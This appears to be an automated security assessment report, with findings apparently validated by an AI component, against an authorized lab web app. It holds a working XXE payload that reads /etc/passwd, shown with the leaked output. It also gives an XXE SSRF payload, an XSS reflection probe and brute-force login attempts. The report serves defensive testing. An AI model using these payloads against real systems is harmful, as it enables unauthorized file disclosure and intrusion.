# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — path-traversal XXE in SOAP /soap_service (account_id) — arbitrary local file read (/etc/passwd)](#finding-1)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [2. MEDIUM — ssrf XXE-based SSRF in SOAP /soap_service (external entity outbound fetch)](#finding-2)
    - [3. MEDIUM — vulnerable-component End-of-life Python 3.8.20 runtime (EOL 2024-10-07, no further security patches)](#finding-3)
    - [4. LOW — xss-reflected Unescaped account_id reflection into innerHTML sink (potential reflected XSS) on dashboard SOAP response](#finding-4)
    - [5. LOW — rate-limit No rate-limiting / account lockout on login (brute-force & credential stuffing)](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0s8uo3-rbw2ac` |
| Target | http://target.local:32810/ |
| Started | 2026-06-30T15:09:35.663Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 1 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32810`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

1 finding(s): 1 high

_Plus 4 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [path-traversal] XXE in SOAP /soap_service (account_id) — arbitrary local file read (/etc/passwd)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32810/

XXE: the POST /soap_service endpoint parses raw XML request bodies without disabling external entities. A DOCTYPE defining an external SYSTEM entity (file:///etc/passwd) referenced inside the <account_id> element is resolved by the XML parser, and its contents are reflected verbatim in the <account_id> field of the GetAccountInfoResponse — yielding arbitrary local file read on the server. Because the SOAP response is also rendered into the dashboard via innerHTML, leaked content is additionally displayed in the browser. An attacker can read sensitive files (app source, config, secrets) and pivot to SSRF via other URI schemes (http://).

**Reproduction**

```
POST http://target.local:32810/soap_service with Content-Type: application/xml and body:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>
The response's <account_id> field contains the full /etc/passwd (root:x:0:0:...). Negative control (ev-mr0sddc2-9): same request with account_id=123456 returns only normal account data, no file contents. Positive replays ev-mr0sdwdz-b / ev-mr0sdxsa-c both leak /etc/passwd.
```

**Evidence**

- Evidence `ev-mr0sddc2-9` — `artifacts/s-0001/ev-mr0sddc2-9/`

Request:

```http
POST /soap_service HTTP/1.1
Host: target.local:32810
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/xml

<GetAccountInfoRequest><account_id>123456</account_id></GetAccountInfoRequest>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 307
content-type: application/xml; charset=utf-8
date: Tue, 30 Jun 2026 15:13:06 GMT
server: Werkzeug/3.0.6 Python/3.8.20


            <GetAccountInfoResponse>
                <account_id>123456</account_id>
                <balance>1000 USD</balance>
                <recent_transactions>Transaction1</recent_transactions><recent_transactions>Transaction2</recent_transactions>
            </GetAccountInfoResponse>
```

- Evidence `ev-mr0sdwdz-b` — `artifacts/s-0001/ev-mr0sdwdz-b/`

Request:

```http
POST /soap_service HTTP/1.1
Host: target.local:32810
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1140
content-type: application/xml; charset=utf-8
date: Tue, 30 Jun 2026 15:13:30 GMT
server: Werkzeug/3.0.6 Python/3.8.20


            <GetAccountInfoResponse>
                <account_id>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</account_id>
                <balance>1000 USD</balance>
                <recent_transactions>Transaction1</recent_transactions><recent_transactions>Transaction2</recent_transactions>
            </GetAccountInfoResponse>
```

- Evidence `ev-mr0sdxsa-c` — `artifacts/s-0001/ev-mr0sdxsa-c/`

Request:

```http
POST /soap_service HTTP/1.1
Host: target.local:32810
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1140
content-type: application/xml; charset=utf-8
date: Tue, 30 Jun 2026 15:13:32 GMT
server: Werkzeug/3.0.6 Python/3.8.20


            <GetAccountInfoResponse>
                <account_id>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</account_id>
                <balance>1000 USD</balance>
                <recent_transactions>Transaction1</recent_transactions><recent_transactions>Transaction2</recent_transactions>
            </GetAccountInfoResponse>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-2"></a>

### 2. [SUSPECTED] [MEDIUM] [ssrf] XXE-based SSRF in SOAP /soap_service (external entity outbound fetch)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32810/

**Anomaly (why this is a lead):** XXE external-entity processing is confirmed (file:///etc/passwd read in ev-mr0sdwdz-b), so the parser resolves attacker-controlled SYSTEM URIs; an http:// entity should yield SSRF, but no Collaborator callback arrived within 35s — the isolated lab host appears to have no outbound internet egress, leaving OOB unconfirmable here despite the primitive being present.

The same XXE flaw (f-001) resolves attacker-supplied SYSTEM URIs. file:// resolution is proven (leaked /etc/passwd), which means an http:// SYSTEM entity should force the server to make outbound requests to an attacker-chosen host (SSRF) — usable to reach internal services or cloud metadata. I could not observe a Burp Collaborator DNS/HTTP callback (20s and 35s waits both empty), almost certainly because this isolated lab host (target.local) has no outbound internet egress to the Collaborator domain, not because the sink is filtered.

**Reproduction**

```
POST http://target.local:32810/soap_service, Content-Type application/xml, body:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://INTERNAL-HOST/">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>
On a host with egress, the server fetches the URL. file:// variant already confirmed external-entity resolution (ev-mr0sdwdz-b). To verify in this environment, point the entity at a reachable internal host/port and observe differential timing/response, or run probe_oob from a network with egress.
```

**Evidence**

- Evidence `ev-mr0sdwdz-b` — `artifacts/s-0001/ev-mr0sdwdz-b/`

Request:

```http
POST /soap_service HTTP/1.1
Host: target.local:32810
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1140
content-type: application/xml; charset=utf-8
date: Tue, 30 Jun 2026 15:13:30 GMT
server: Werkzeug/3.0.6 Python/3.8.20


            <GetAccountInfoResponse>
                <account_id>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</account_id>
                <balance>1000 USD</balance>
                <recent_transactions>Transaction1</recent_transactions><recent_transactions>Transaction2</recent_transactions>
            </GetAccountInfoResponse>
```

<a id="finding-3"></a>

### 3. [SUSPECTED] [MEDIUM] [vulnerable-component] End-of-life Python 3.8.20 runtime (EOL 2024-10-07, no further security patches)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32810/

**Anomaly (why this is a lead):** Server header on every response reads `Werkzeug/3.0.6 Python/3.8.20`. Python 3.8 reached end-of-life on 2024-10-07 and 3.8.20 was its final release — the CPython runtime now receives no security patches, so any stdlib CVE disclosed after EOL (e.g. in http/ssl/xml/tarfile parsers) stays permanently unpatched here. Version/banner-based; not actively exploited.

The application runs on Python 3.8.20, exposed via the `Server: Werkzeug/3.0.6 Python/3.8.20` response header on all endpoints (/, /login, /dashboard, /soap_service). Python 3.8 is end-of-life as of 2024-10-07; 3.8.20 (Sept 2024) was the last release of the branch. No upstream security fixes will be issued for this runtime going forward, so the deployment will accrue unpatched CPython vulnerabilities over time and cannot be remediated except by upgrading to a supported branch (3.12/3.13+). This is a version-based / EOL determination, not an actively confirmed exploit. Remediation: migrate to a currently supported Python release.

**Reproduction**

```
1. Send any request, e.g. `GET http://target.local:32810/login`.
2. Inspect the response `Server` header: `Werkzeug/3.0.6 Python/3.8.20`.
3. Cross-reference Python release lifecycle: 3.8 EOL = 2024-10-07; 3.8.20 is the final 3.8.x release. No further security maintenance.
```

**Evidence**

- Evidence `ev-mr0ss2pu-1p` — `artifacts/_/ev-mr0ss2pu-1p/`

Request:

```http
GET /login HTTP/1.1
Host: target.local:32810
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 560
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:24:32 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <form method="post" action="/login">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [SUSPECTED] [LOW] [xss-reflected] Unescaped account_id reflection into innerHTML sink (potential reflected XSS) on dashboard SOAP response

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32810/

**Anomaly (why this is a lead):** account_id is reflected UNESCAPED in the SOAP response (raw <b>xss</b> echoed, ev-mr0sf9ug-f) and the dashboard assigns that response to innerHTML, a real DOM XSS sink; but account_id is hardcoded to 123456 with no attacker-controlled URL→body path, so cross-user execution could not be delivered or auto-confirmed this run.

The SOAP service reflects the request's account_id verbatim/unescaped in the GetAccountInfoResponse (verified: input AMR<b>xss</b>CHK returned with raw <b> tags, ev-mr0sf9ug-f). The dashboard JS (loadInfo) fetches this response and assigns it directly to element.innerHTML, so an injected <img src=x onerror=...> in account_id would execute when rendered. The combination is a genuine client-side XSS sink. However, the dashboard hardcodes account_id=123456 and exposes no attacker-controlled URL parameter that flows into the SOAP body, so a cross-user delivery vector could not be established within the app; probe_xss could not auto-confirm execution (response is application/xml, not text/html). Recorded as a lead — the unescaped reflection + innerHTML sink is a real defect worth a code-level fix (escape SOAP response data / avoid innerHTML).

**Reproduction**

```
POST http://target.local:32810/soap_service, Content-Type application/xml, body:
<GetAccountInfoRequest><account_id>AMR<b>xss</b>CHK</account_id></GetAccountInfoRequest>
Response echoes <account_id>AMR<b>xss</b>CHK</account_id> with raw HTML (ev-mr0sf9ug-f). Dashboard JS does document.getElementById('accountInfo').innerHTML = data, so an onerror payload would fire in the browser. Negative control: account_id=123456 returns escaped/benign content (ev-mr0sddc2-9).
```

**Evidence**

- Evidence `ev-mr0sf9ug-f` — `artifacts/s-0001/ev-mr0sf9ug-f/`

Request:

```http
POST /soap_service HTTP/1.1
Host: target.local:32810
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/xml

<GetAccountInfoRequest><account_id>AMR&lt;b&gt;xss&lt;/b&gt;CHK</account_id></GetAccountInfoRequest>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 317
content-type: application/xml; charset=utf-8
date: Tue, 30 Jun 2026 15:14:34 GMT
server: Werkzeug/3.0.6 Python/3.8.20


            <GetAccountInfoResponse>
                <account_id>AMR<b>xss</b>CHK</account_id>
                <balance>1000 USD</balance>
                <recent_transactions>Transaction1</recent_transactions><recent_transactions>Transaction2</recent_transactions>
            </GetAccountInfoResponse>
```

<a id="finding-5"></a>

### 5. [SUSPECTED] [LOW] [rate-limit] No rate-limiting / account lockout on login (brute-force & credential stuffing)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32810/

**Anomaly (why this is a lead):** 13 consecutive failed POST /login attempts for user 'john' all returned an immediate identical 401 'Invalid credentials' with zero throttling: no lockout, no CAPTCHA, no progressive delay, no 429/Retry-After header. The endpoint imposes no rate limit on authentication, enabling unlimited brute-force / credential-stuffing attacks.

The POST /login endpoint applies no anti-automation controls. Across 13+ consecutive failed authentication attempts for the same account ('john') — mixing wrong passwords and SQLi payloads — every request was processed immediately and returned the same 401 'Invalid credentials' with no account lockout, no progressive delay, no CAPTCHA, and no 429/Retry-After. This leaves the login open to unrestricted password brute-forcing and credential stuffing.

**Reproduction**

```
Send POST /login (application/x-www-form-urlencoded, body username=john&password=<guess>) repeatedly in rapid succession with varying passwords. Observed: every attempt returns 401 'Invalid credentials' instantly; no lockout/throttle/CAPTCHA appears after 13+ failures (evidence ev-mr0sm6p9-16 .. ev-mr0smax1-1a plus earlier attempts).
```

**Evidence**

- Evidence `ev-mr0smax1-1a` — `artifacts/s-0002/ev-mr0smax1-1a/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32810
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
content-type: application/x-www-form-urlencoded

username=john&password=brute5
```

Response:

```http
HTTP/1.1 401
connection: close
content-length: 19
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 15:20:02 GMT
server: Werkzeug/3.0.6 Python/3.8.20

Invalid credentials
```
